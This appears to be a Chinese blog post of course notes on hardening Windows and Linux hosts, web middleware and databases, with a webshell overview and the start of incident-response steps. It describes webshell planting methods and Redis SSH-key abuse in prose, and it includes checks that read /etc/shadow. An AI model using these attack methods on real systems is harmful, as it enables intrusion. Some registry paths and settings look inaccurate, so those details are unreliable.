<p>•远程关机<br>•在本地安全设置中，从远端系统强制关机权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 从远端系统强制关机 权限只分配给Administrators组。<br>•本地关机在本地安全设置中关闭系统权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 关闭系统 权限只分配给Administrators组。<br>•用户权限指派<br>•在本地安全设置中，取得文件或其它对象的所有权权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 取得文件或其它对象的所有权 权限只分配给Administrators组。<br>•授权帐户登录<br>•在本地安全设置中，配置指定授权用户允许本地登录此计算机。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 允许本地登录 权限给指定授权用户。<br>•授权帐户从网络访问<br>•在本地安全设置中，只允许授权帐号从网络访问（包括网络共享等，但不包括终端服务）此计算机。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 从网络访问此计算机 权限给指定授权用户。</p>
<hr>
<p><strong>日志配置操作</strong></p>
<p>•审核登录<br>•设备应配置日志功能，对用户登录进行记录。记录内容包括用户登录使用的帐户、登录是否成功、登录时间、以及远程登录时、及用户使用的IP地址。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核登录事件。<br>•审核策略<br>•启用本地安全策略中对Windows系统的审核策略更改，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核策略更改。<br>•审核对象访问<br>•启用本地安全策略中对Windows系统的审核对象访问，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核对象访问。<br>•审核事件目录服务访问<br>•启用本地安全策略中对Windows系统的审核目录服务访问，仅需要审核失败操作。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核目录服务器访问。<br>•审核特权使用<br>•启用本地安全策略中对Windows系统的审核特权使用，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核特权使用。<br>•审核系统事件<br>•启用本地安全策略中对Wi d 系统的审核系统事件 成功和失败操作都需要审核<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核系统事件。<br>•审核帐户管理<br>•启用本地安全策略中对Windows系统的审核帐户管理，成功和失败操作都要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核帐户管理。<br>•审核过程追踪<br>•启用本地安全策略中对Windows系统的审核进程追踪，仅失败操作需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核进程追踪。<br>•日志文件大小<br>•设置应用日志文件大小至少为 8192 KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。并设置当达到最大的日志尺寸时，按需要轮询记录日志。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 事件查看器，配置应用日志、系统日志、安全日志属性中的日志大小，以及设置当达到最大的日志尺寸时的相应策略。</p>
<hr>
<p><strong>IP协议安全配置</strong></p>
<p>•IP协议安全<br>•启用SYN攻击保护<br>•启用SYN攻击保护。<br>•指定触发SYN洪水攻击保护所必须超过的TCP连接请求数阈值为5。<br>•指定处于 SYN_RCVD 状态的 TCP 连接数的阈值为500。<br>•指定处于至少已发送一次重传的 SYN_RCVD 状态中的 TCP 连接数的阈值为400。<br>•操作步骤<br>•打开 注册表编辑器，根据推荐值修改注册表键值。<br>•Windows Server 2012<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect<br>•推荐值：2<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\TcpMaxHalfOpen<br>•推荐值：500<br>•Windows Server 2008<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SynAttackProtect<br>•推荐值：2<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxPortsExhausted<br>•推荐值：5<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpen<br>•推荐值：500<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpenRetried<br>•推荐值：400</p>
<hr>
<p><strong>文件权限</strong></p>
<p>•共享文件夹及访问权限<br>•关闭默认共享<br>•非域环境中，关闭Windows硬盘默认共享，例如C$，D$。<br>•操作步骤<br>•打开 注册表编辑器，根据推荐值修改注册表键值。<br>•注意： Windows Server 2012版本已默认关闭Windows硬盘默认共享，且没有该注册表键值。<br>•HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer<br>•推荐值： 0<br>•共享文件夹授权访问<br>•每个共享文件夹的共享权限，只允许授权的帐户拥有共享此文件夹的权限。<br>•操作步骤<br>•每个共享文件夹的共享权限仅限于业务需要，不要设置成为 Everyone。打开 控制面板 &gt; 管理工具 &gt; 计算机管理，在共享文件夹 中，查看每个共享文件夹的共享权限。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225939164.png" alt="image-20220722225939164"></p>
<hr>
<p><strong>服务安全</strong></p>
<p>•禁用TCP/IP上的NetBIOS<br>•禁用TCP/IP上的NetBIOS协议，可以关闭监听的 UDP 137（netbios-ns）、UDP 138（netbios-dgm）以及 TCP 139（netbios-ssn）端口。<br>•操作步骤<br>•在 计算机管理 &gt; 服务和应用程序 &gt; 服务 中禁用 TCP/IP NetBIOS Helper 服务。<br>•在网络连接属性中，双击 Internet协议版本4（TCP/IPv4），单击 高级。在 WINS 页签中，进行如下设置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230058011.png" alt="image-20220722230058011"></p>
<p>•禁用不必要的服务<br>•禁用不必要的服务，请参考：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230118317.png" alt="image-20220722230118317"></p>
<hr>
<p><strong>安全选项</strong></p>
<p>•启用安全选项<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，进行如下设置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230239898.png" alt="image-20220722230239898"></p>
<p>•禁用未登录前关机<br>•服务器默认是禁止在未登录系统前关机的。如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客造成可乘之机，强烈建议禁用未登录前关机功能。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，禁用 关机：允许系统在未登录前关机 策略。</p>
<hr>
<p><strong>其他安全配置</strong></p>
<p>•防病毒管理<br>•Windows系统需要安装防病毒软件。<br>•操作步骤<br>•安装企业级防病毒软件，并开启病毒库更新及实时防御功能。<br>•7.2 设置屏幕保护密码和开启时间<br>•设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。<br>•操作步骤<br>•启用屏幕保护程序，设置等待时间为 5分钟，并启用 在恢复时使用密码保护。<br>•7.3 限制远程登录空闲断开时间<br>•对于远程登录的帐户，设置不活动超过时间15分钟自动断开连接。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，设置 Microsoft网络服务器：暂停会话前所需的空闲时间数量属性为15分钟。<br>•7.4 操作系统补丁管理<br>•安装最新的操作系统Hotfix补丁。安装补丁时，应先对服务器系统进行兼容性测试。<br>•操作步骤<br>•安装最新的操作系统Hotfix补丁。安装补丁时，应先对服务器系统进行兼容性测试。<br>•注意：对于实际业务环境服务器，建议使用通知并自动下载更新，但由管理员选择是否安装更新，而不是使用自动安装更新，防止自动更新补丁对实际业务环境产生影响。</p>
<h2 id="linux主机加固"><a href="#linux主机加固" class="headerlink" title="linux主机加固"></a>linux主机加固</h2><p><strong>账号和口令</strong></p>
<p>•禁用或删除无用账号<br>•减少系统无用账号，降低安全风险。</p>
<p>•操作步骤<br>•cat /etc/shadow 查看有多少账户<br>•使用命令 userdel &lt;用户名&gt; 删除不必要的账号。<br>•使用命令 passwd -l &lt;用户名&gt; 锁定不必要的账号。<br>•使用命令 passwd -u &lt;用户名&gt; 解锁必要的账号。</p>
<p>•检查特殊账号<br>•检查是否存在空口令和root权限的账号。<br>•操作步骤<br>•查看空口令和root权限账号，确认是否存在异常账号：<br>•使用命令 awk -F: ‘($2==””)’ /etc/shadow 查看空口令账号。<br>•使用命令 awk -F: ‘($3==0)’ /etc/passwd 查看UID为零的账号。 //root权限的账户<br>•加固空口令账号：<br>•使用命令 passwd &lt;用户名&gt; 为空口令账号设定密码。<br>•确认UID为零的账号只有root账号。</p>
<p>•添加口令策略<br>•加强口令的复杂度等，降低被猜解的可能性。<br>•操作步骤<br>•使用命令 vi /etc/login.defs 修改配置文件。<br>•PASS_MAX_DAYS 90 #新建用户的密码最长使用天数<br>•PASS_MIN_DAYS 0 #新建用户的密码最短使用天数<br>•PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数<br>•使用chage命令修改用户设置。<br>•例如，chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户。<br>•设置连续输错三次密码，账号锁定五分钟。使用命令 vi /etc/pam.d/common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr=fail deny=3 unlock_time=300。<br>•限制用户su<br>•限制能su到root的用户。<br>•操作步骤<br>•使用命令 vi /etc/pam.d/su修改配置文件，在配置文件中添加行。例如，只允许test组用户su到root，则添加 auth required pam_wheel.so group=test。<br>•禁止root用户直接登录<br>•限制root用户直接登录。<br>•操作步骤<br>•创建普通权限账号并配置密码,防止无法远程登录;<br>•使用命令 vi /etc/ssh/sshd_config修改配置文件将PermitRootLogin的值改成no，并保存，然后使用service sshd restart重启服务。</p>
<hr>
<p><strong>服务</strong></p>
<p>•关闭不必要的服务<br>•关闭不必要的服务（如普通服务和xinetd服务），降低风险。<br>•操作步骤<br>•使用命令systemctl disable &lt;服务名&gt;设置服务在开机时不自动启动。<br>•chkconfig –list 查看启动服务<br>•说明： 对于部分老版本的Linux操作系统（如CentOS 6），可以使用命令chkconfig –level &lt;init级别&gt; &lt;服务名&gt; off设置服务在指定init级别下开机时不自动启动。<br>•SSH服务安全<br>•对SSH服务进行安全加固，防止暴力破解成功。<br>•操作步骤<br>•使用命令 vim /etc/ssh/sshd_config 编辑配置文件。<br>•不允许root账号直接登录系统。<br>•设置 PermitRootLogin 的值为 no。<br>•修改SSH使用的协议版本。<br>•设置 Protocol 的版本为 2。<br>•修改允许密码错误次数（默认6次）。<br>•设置 MaxAuthTries 的值为 3。<br>•配置文件修改完成后，重启sshd服务生效。</p>
<hr>
<p><strong>文件系统</strong></p>
<p>•设置umask值<br>•设置默认的umask值，增强安全性。<br>•操作步骤<br>•使用命令 vi /etc/profile 修改配置文件，添加行 umask 027， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。<br>•设置登录超时<br>•设置系统登录后，连接超时时间，增强安全性。<br>•操作步骤<br>•使用命令 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为TMOUT=180，即超时时间为三分钟。</p>
<hr>
<p><strong>日志</strong></p>
<p>•syslogd日志<br>•启用日志功能，并配置日志记录。<br>•操作步骤<br>•Linux系统默认启用以下类型日志：<br>•系统日志（默认）/var/log/messages<br>•cron日志（默认）/var/log/cron<br>•安全日志（默认）/var/log/secure<br>•注意：部分系统可能使用syslog-ng日志，配置文件为：/etc/syslog-ng/syslog-ng.conf。<br>•您可以根据需求配置详细日志。<br>•记录所有用户的登录和操作日志<br>•通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<br>•操作步骤<br>•运行 [root@xxx /]# vim /etc/profile打开配置文件。<br>•在配置文件中输入以下内容：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">USER=`whoami`</span><br><span class="line">USER_IP=`who -u am i <span class="number">2</span>&gt;<span class="regexp">/dev/</span>null| awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>|sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$USER_IP&quot;</span> = <span class="string">&quot;&quot;</span> ]; then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="regexp">/var/</span>log/history ]; then</span><br><span class="line">mkdir <span class="regexp">/var/</span>log/history</span><br><span class="line">chmod <span class="number">777</span> <span class="regexp">/var/</span>log/history</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span> ]; then</span><br><span class="line">mkdir <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">chmod <span class="number">300</span> <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">fi</span><br><span class="line">export HISTSIZE=<span class="number">4096</span></span><br><span class="line">DT=`date +<span class="string">&quot;%Y%m%d_%H:%M:%S&quot;</span>`</span><br><span class="line">export HISTFILE=<span class="string">&quot;/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT&quot;</span></span><br><span class="line">chmod <span class="number">600</span></span><br><span class="line"><span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span><span class="regexp">/*history* 2&gt;/</span>dev/null</span><br><span class="line">运行 [root@xxx <span class="regexp">/]# source /</span>etc/profile 加载配置生效。</span><br><span class="line">注意： <span class="regexp">/var/</span>log<span class="regexp">/history 是记录日志的存放位置，可以自定义。通过上述步骤，可以在 /</span>var<span class="regexp">/log/</span>history 目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外）。同时，建议您使用OSS服务收集存储日志。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>安全审计</strong></p>
<p>•审计内容包括系统内重要的安全相关事件<br>•实操：<br>•结果将导致发生故障或入侵事件不便于分析故障或入侵行为，不能再需要时作为证据</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">•service rsyslog ststus,service auditd status,</span><br><span class="line">•cat <span class="regexp">/etc/</span>audit/auditd.conf中是否配置</span><br><span class="line">•write_logs = yes</span><br><span class="line">•log_file = <span class="regexp">/var/</span>log<span class="regexp">/audit/</span>audit.log</span><br><span class="line">•log_format = RAW</span><br><span class="line">•max_log_file = <span class="number">8</span></span><br><span class="line">•num_logs = <span class="number">5</span></span><br><span class="line">•max_log_file_action = ROTATE</span><br><span class="line">•cat <span class="regexp">/etc/</span>audit/audit.rules查看是否存在</span><br><span class="line">• -w <span class="regexp">/etc/</span>passwd -p rwa -k passwd_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>shadow -p rwa -k shadow_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>sudoers -p rwa -k sudoers_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>rsyslog.conf -p rwa -k rsyslog_changes</span><br><span class="line">• -w <span class="regexp">/etc/g</span>roup -p rwa -k group_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/message -p rwa -k message_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/secure -p rwa -k secure_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/maillog -p rwa -k maillog_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/cron -p rwa -k cron_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/spooler -p rwa -k spooler_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>audit/audit.rules -p rwa -k audit_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>audit<span class="regexp">/rules.d/</span>audit.rules -p rwa -k audit_changes</span><br><span class="line">•cat <span class="regexp">/etc/</span>rsyslog.conf 查看是否存在</span><br><span class="line">•kern.warning;*.err;*.info;kern.debug;daemon.notice;mail.none;authpriv.none;cron.none <span class="regexp">/var/</span>log/kern.log</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>时间</strong></p>
<p>•安全审计记录未包含所有重要的审计记录字段，未配置NTP校正系统时间<br>•操作：date查看当前系统时间<br>•意义：无法进行关联分析，不能及时对部分较复杂的安全事件进行发现和报警</p>
<p>•操作系统未安装专门的审计进程保护软件，无法对审计进程进行保护，避免受到未预期中断，日志保留时间小于6个月<br>•cat /etc/rsyslog.conf中查看是否存在<br>•<code>*.*@@192.168.101.100:514</code><br>•或询问是否存在其他措施对审计日志进行保护</p>
<hr>
<p><strong>更新系统内核和安装防病毒软件</strong></p>
<p>•使用命令uname -sr查看<br>•Centos7/RHEL7 3.10.0-1062.1.2.el7<br>•Cetnos6/RHEL6 2.6.32-754.23.1.el6<br>•询问管理员是否有月度主机扫描报告<br>定期对操作系统进行漏洞扫描并修补发现的漏洞，未更新系统内核至官方最新安全版。</p>
<hr>
<p><strong>Linux系统安装杀毒软件clamav</strong></p>
<p>•在线演示<br>•<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hftian/p/11711701.html">https://www.cnblogs.com/hftian/p/11711701.html</a></p>
<p>•Webshell 样例<br>•以下是一个php的样例。从界面看，它的功能还是比较全的，可以对服务器的文件目录进行读写操作。如果你是网站管理员的话，肯定不希望普通用户获得下面的权限。</p>
<p>•Webshell如何被注入<br>•常见的Webshell植入方式以下类型：<br>•利用站点上传漏洞，上传Webshell。<br>•系统前台的上传业务可被利用来上传Webshell脚本，而被上传的目录往往对用户开放可执行权限。在Web中有上传图像、资料文件的地方，上传完后通常会向客户端返回上传文件的完整URL信息；该URL一般是常见的image、upload等目录。<br>•如果Web服务器对网站存取权限或者文件夹目录权限控制不严，就可能被利用来实现Webshell攻击。攻击者可以利用上传功能上传一个脚本文件，然后通过URL访问并执行这个脚本；然后攻击者就可以上传Webshell到网站的任意目录中，从而拿到网站的管理员控制权限。<br>•黑客获取管理员的后台密码，登录到后台系统，利用后台的管理工具向配置文件写入Webshell木马；或者私自添加上传类型，允许上传类似ASP、PHP格式的脚本程序文件。<br>•利用数据库备份与恢复功能获取Webshell。例如，备份时把备份文件的后缀改成 .asp；如果后台有MySQL数据查询功能，黑客可以执行select..in To outfile查询输出PHP文件，并把代码插入到MySQL，从而生成Webshell的木马。<br>•系统中其他站点被攻击，或者服务器上还搭载了FTP服务器。FTP服务器被攻击时被注入了Webshell的木马，导致网站系统被感染。<br>•黑客直接攻击Web服务器系统漏洞，实现入侵。Web服务器在系统层面也可能存在漏洞，如果黑客利用其漏洞攻击服务器系统；在获取其权限后，黑客就可以在Web服务器目录里上传Webshell文件。<br>•综上，Webshell能够入侵到系统，一般是由于以下原因：<br>•通过Web站点漏洞上传Webshell。<br>•Webshell能够被注入，在很大程度是由于服务器或中间件的安全漏洞。例如，以下常见漏洞都可能被利用来注入Webshell：旧版本的IIS目录解析漏洞、文件名解析漏洞、应用后台暴露和弱口令、Fast-CGI解析漏洞、Apache文件解析漏洞、截断上传、后台数据库备份功能上传、数据库语句上传漏洞等。<br>•站点部署时混入了Webshell文件。<br>•大量的用户在使用从网上下载的第三方开源代码时，其代码本身已经混入了Webshell的恶意脚本，造成二次入侵或多次入侵。所以在部署前期，如果不是新开发的代码，都需要对代码进行恶意文件扫描查杀，防止上线后被入侵。</p>
<hr>
<p><strong>如何防止系统被植入Webshell</strong></p>
<p>•配置必要的防火墙并开启防火墙策略；防止暴露不必要的服务，为黑客提供利用条件。<br>•对服务器进行 安全加固。例如，关闭远程桌面功能、定期更换密码、禁止使用最高权限用户运行程序、使用HTTPS加密协议。<br>•加强权限管理，对敏感目录进行权限设置，限制上传目录的脚本执行权限，不允许配置执行权限等。<br>•安装Webshell检测工具，发现检测结果后，立即隔离查杀，并排查漏洞。<br>•排查程序存在的漏洞，并及时修补漏洞。您可以通过应急响应服务人工界入，协助排查漏洞及入侵原因，同时可以选用商业Web应用防火墙进行防御，降低被入侵机率。</p>
<hr>
<p><strong>网站被植入Webshell的解决方案</strong></p>
<p>•Webshell<br>•从字面上理解，”Web”指需要服务器开放Web服务，”shell”指取得对服务器的某种程度的操作权限。Webshell指匿名用户（入侵者）通过网站端口，获取网站服务器的一定操作权限。<br>•Webshell通常是以ASP、PHP、JSP、ASA或者CGI等网页文件形式存在的一种命令执行环境，也称为网页后门。黑客在入侵网站后，通常会将Webshell后门文件与网站服务器Web目录下正常的网页文件混在一起；然后使用浏览器来访问这些后门，得到命令执行环境，以达到控制网站或者Web系统服务器的目的。<br>•黑客如果想使用Webshell完成一些特殊的功能，就不可避免地用到一些特殊函数。通过对这些函数进行对照特征值检查，就能够定位Webshell，但是Webshell本身也会进行加密来躲避这种检测。</p>
<h2 id="中-间-件-加-固"><a href="#中-间-件-加-固" class="headerlink" title="中 间 件 加 固"></a>中 间 件 加 固</h2><p><strong>apache加固</strong></p>
<p>以专门的用户帐号和用户组运行Apache服务</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232126336.png" alt="image-20220722232126336"></p>
<p>授权设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232149625.png" alt="image-20220722232149625"></p>
<p>日志设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232223831.png" alt="image-20220722232223831"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232235811.png" alt="image-20220722232235811"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232250740.png" alt="image-20220722232250740"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232310109.png" alt="image-20220722232310109"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232325275.png" alt="image-20220722232325275"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232341493.png" alt="image-20220722232341493"></p>
<hr>
<p><strong>Tomcat安全加固</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232412514.png" alt="image-20220722232412514"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232425547.png" alt="image-20220722232425547"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232442109.png" alt="image-20220722232442109"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232452273.png" alt="image-20220722232452273"></p>
<hr>
<p><strong>nginx安全加固</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232530087.png" alt="image-20220722232530087"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232541764.png" alt="image-20220722232541764"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232551597.png" alt="image-20220722232551597"></p>
<h2 id="数-据-库-加-固"><a href="#数-据-库-加-固" class="headerlink" title="数 据 库 加 固"></a>数 据 库 加 固</h2><p><strong>mysql加固</strong></p>
<p>漏洞发现<br>通过漏扫发现数据库问题</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232632292.png" alt="image-20220722232632292"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232644526.png" alt="image-20220722232644526"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232657593.png" alt="image-20220722232657593"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232707665.png" alt="image-20220722232707665"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232717725.png" alt="image-20220722232717725"></p>
<p>安装最新补丁<br>确保系统安装了最新的安全补丁。<br>注意:在保证业务及网络安全的前提下，并经过兼容性测试后，安装更新补丁。<br>如果不需要，应禁止远程访问<br>禁止网络连接，防止猜解密码攻击、溢出攻击、和嗅探攻击。<br>注意:仅限于应用和数据库在同一台主机的情况。<br>如果数据库不需要远程访问，可以禁止远程TCP/IP连接，通过在MySQL服务器的启动参数中添加–skip-networking参数使MySQL服务不监听任何TCP/IP连接，增加安全性。<br>您可以使用安全组进行内外网访问控制，建议不要将数据库高危服务对互联网开放。</p>
<p>设置可信IP访问控制<br>通过数据库所在操作系统的防火墙限制，实现只有信任的IP才能通过监听器访问数据库。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232838714.png" alt="image-20220722232838714"></p>
<p>连接数设置<br>根据您的机器性能和业务需求，设置最大、最小连接数。<br>在MySQL配置文件(my.conf或my.ini)的[mysqld]配置段中添加max_ connections = 1000，保存配置文件，重启MySQL服务后即可生效。</p>
<hr>
<p><strong>Memcached服务安全加固</strong><br>漏洞描述<br>Memcached是- -套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcached服务很容易被攻击者扫描<br>发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<p>修复方案<br>●Memcached默认没有启用安全功能，建议用户在使用时进行安全加固。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233026904.png" alt="image-20220722233026904"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233043742.png" alt="image-20220722233043742"></p>
<hr>
<p><strong>Redis服务安全加固</strong><br>漏洞描述<br>●Redis因配置不当存在未授权访问漏洞，可以被攻击者恶意利用。<br>●在特定条件下，如果Redis以root身份运行，黑客可以给root账号写入SSH公钥文件，直接通过SSH登录受害服务器，从而获取<br>服务器权限和数据。一旦入侵成功，攻击者可直接添加账号用于SSH远程登录控制服务器，给用户的Redis运行环境以及Linux主<br>机带来安全风险，如删除、泄露或加密重要数据，引发勒索事件等。</p>
<p>●受影响范围<br>●在Redis客户端，尝试无账号登录Redis:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233244650.png" alt="image-20220722233244650"></p>
<p>修复方案</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233310772.png" alt="image-20220722233310772"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233328583.png" alt="image-20220722233328583"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722233347710.png" alt="image-20220722233347710"></p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="Windows-应急"><a href="#Windows-应急" class="headerlink" title="Windows 应急"></a>Windows 应急</h2><p><strong>概述</strong></p>
<p>Q：什么是应急响应？<br>A：当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间<br>内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<ol>
<li>IDS/IPS 告警</li>
<li>某些服务突然崩溃</li>
</ol>
<p>常见的应急响应事件分类：<br>web入侵：网页挂马、主页篡改、Webshell<br>系统入侵：病毒木马、勒索软件、远控后门<br>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p>
<hr>
<p><strong>常见排查思路</strong></p>
<p><strong>一、检查系统账号安全</strong></p>
<ol>
<li>查看服务器是否有弱口令，远程管理端口是否对公网开放。<br>检查方法：据实际情况咨询相关服务器管理员。(最直接有效)</li>
<li>查看服务器是否存在可疑账号、新增账号。<br>检查方法：</li>
</ol>
